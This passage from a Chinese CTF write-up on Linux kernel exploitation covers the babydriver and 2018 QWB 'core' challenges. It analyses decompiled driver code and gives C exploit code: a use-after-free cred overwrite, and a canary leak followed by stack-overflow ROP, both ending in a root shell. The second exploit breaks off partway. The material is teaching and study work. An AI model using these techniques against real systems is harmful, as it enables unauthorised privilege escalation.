class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和上面的验证一样。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>这里可以看到不存在任何溢出，但是这里跟传统用户态不同的是这里的全局变量是整个系统中全局的。那意思就是这里是存在UAF漏洞的。</p><p>所以基本思路就是：</p><pre><code> 1. 首先打开两次设备，更改chunk size为cred结构体的size 2. 释放其中一个，这时就会出现0xa8的空白，那么我们fork一个新的进程，就会让进程的cred结构体占据那一空间 3. 我们还可以通过另一文件描述符修改掉内部的值，提权到root</code></pre><p>综上得出exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;stropts.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> payload[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now!&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后使用gcc静态编译打包进文件系统就好了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -static -o exploit</span><br><span class="line">cp exploit core/tmp </span><br><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br><span class="line">cp rootfs.cpio ..</span><br></pre></td></tr></table></figure><h2 id="2018-强网杯-core"><a href="#2018-强网杯-core" class="headerlink" title="2018 强网杯 - core"></a>2018 强网杯 - core</h2><p>这道题目的文件多了一个vmlinux，是未经过压缩的kernel文件，不过根据我的实践发现不能直接在题目给的vmlinux提取gedget，可以通过<a class="link"   href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" >extract-vmlinux<i class="fas fa-external-link-alt"></i></a>提取vmlinux来获取再用<a class="link"   href="https://github.com/sashs/Ropper" >Ropper<i class="fas fa-external-link-alt"></i></a>来提取。</p><p>一样的先看一下start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcdy@arch-linux ~/Downloads/study_kernel % cat -n start.sh </span><br><span class="line">     1qemu-system-x86_64 \</span><br><span class="line">     2-m 256M \</span><br><span class="line">     3-kernel ./bzImage \</span><br><span class="line">     4-initrd  ./core.cpio \</span><br><span class="line">     5-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">     6-s  \</span><br><span class="line">     7-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">     8-nographic  \</span><br></pre></td></tr></table></figure><p>可以看到在第五行里面开启了kaslr，这一保护类似与aslr，需要泄漏地址才能获取gadget的地址。</p><p>再看一下init文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">tcdy@arch-linux ~/Downloads/study_kernel/core % cat -n init </span><br><span class="line">     1<span class="comment">#!/bin/sh</span></span><br><span class="line">     2mount -t proc proc /proc</span><br><span class="line">     3mount -t sysfs sysfs /sys</span><br><span class="line">     4mount -t devtmpfs none /dev</span><br><span class="line">     5/sbin/mdev -s</span><br><span class="line">     6mkdir -p /dev/pts</span><br><span class="line">     7mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">     8chmod 666 /dev/ptmx</span><br><span class="line">     9cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">    10<span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">    11<span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">    12ifconfig eth0 up</span><br><span class="line">    13udhcpc -i eth0</span><br><span class="line">    14ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">    15route add default gw 10.0.2.2 </span><br><span class="line">    16insmod /core.ko</span><br><span class="line">    17</span><br><span class="line">    18<span class="comment">#poweroff -d 120 -f &amp;</span></span><br><span class="line">    19setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">    20<span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">    21umount /proc</span><br><span class="line">    22umount /sys</span><br><span class="line">    23</span><br><span class="line">    24poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>可以看到第9行里面，系统将/proc/kallsyms放到了/tmp目录，然后又将kptr_restrict和dmesg_restrict设置为1，就不能通过/proc/kallsyms查看函数地址，以及用dmesg来查看kernel信息了。</p><p>随后看一下驱动文件的保护：</p><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80/image-20220321214610640.png" alt="image-20220321214610640"></p><p>(这篇文章居然跟着我换个系统，哈哈哈哈哈！)</p><h3 id="分析驱动"><a href="#分析驱动" class="headerlink" title="分析驱动"></a>分析驱动</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下可以看到注册到了/proc/core</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>core_ioctl函数可以看到十三个选项，分别看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">core_read</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个core_read在最后做了一件事，就是吧v5[off]的值给到了我们的a1，然而这里的a1又是上一级a3，所以我们使用ioctl函数的第三个参数可以接收到这一值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这里第二个选项可以看到我们还可以随意的修改off，所以我们可以这一方式泄漏出一些值，比如canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_copy_func</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="keyword">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后第三个选项里可以看到将name全局变量复制到v2里，并且可以看到在获取参数时的数据类型为int64但是在qmemcpy函数内使用的却是unsigned int16，如果我们传入的是<code>0xffffffffffff0100</code>就可以造成栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在write函数我们还可以控制全局变量name的内容。</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><pre><code> 1. 通过设置off，使用core_read()泄漏出canary 2. 通过core_write()修改name的值，构造rop链 3. 通过core_copy_func()实现栈溢出，进行rop 4. 返回用户态通过system(&quot;/bin/sh&quot;);获得root shell</code></pre><p>在这里需要注意的是在进入内核之前会保存用户态的各种寄存器，所以在最后还要恢复各种寄存器。这里看一下push保存寄存器的操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br></pre></td></tr></table></figure><p>由于我们会进行ROP，在结束时rsp的值会变动，所以我们就需要自己构造一些值来保证能够正常恢复到用户态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上面只有四个被保存了，因为最后我们希望rip跳转到system(“/bin/sh”);的地址，所以我们只需要好好构造好栈数据即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>, vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] root now!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> payload[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; 